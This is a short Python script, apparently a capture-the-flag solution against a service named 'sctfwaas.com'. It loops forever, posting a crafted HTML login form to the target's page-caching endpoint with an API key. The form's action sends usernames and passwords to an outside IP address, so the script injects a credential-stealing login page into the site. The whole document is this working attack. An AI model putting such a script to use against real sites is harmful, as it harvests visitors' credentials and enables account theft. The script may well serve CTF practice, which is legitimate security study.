import requests

s = requests.Session()

page = '''
              <form class="col s12" method="post" action="http://45.55.68.215:8080">
                <div class="row">
                  <div class="input-field col s4">
                    <input type="text" id="userid" name="userid">
                    <label for="userid">Username</label>
                  </div>
                  <div class="input-field col s4">
                    <input type="password" id="password" name="password">
                    <label for="password">Password</label>
                  </div>
                  <div class="input-field col s4">
                    <div class="row">
                        <button class="waves-effect waves-light btn" type="submit">Login</button>
                    </div>
                  </div>
                </div>
                Last login : {{last_login}} seconds ago <br>
              </div>
            </form>
'''
while True:
	r = s.post('http://sctfwaas.com:8080/', data={
'page': page,
'cache': 'on',
'apikey': '43073909ecc48af12aa63c8f74989bc9523587eca49d37c97edd3027984e6101'})
	print r.text
